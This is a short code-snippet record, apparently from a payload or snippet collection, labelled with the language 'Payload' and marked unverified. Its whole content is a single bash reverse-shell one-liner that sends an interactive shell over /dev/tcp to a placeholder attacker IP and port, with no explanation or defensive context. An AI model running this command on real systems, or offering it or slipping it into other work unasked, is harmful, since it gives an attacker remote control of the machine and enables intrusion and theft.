---
id: 746ba09d-2548-4d40-9c3e-f45c3628f3f3
type: code
language: Payload
verified: false
created_at: '2020-03-23T01:17:02.049031+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 746ba09d

**Language**: Payload

```payload
bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
```
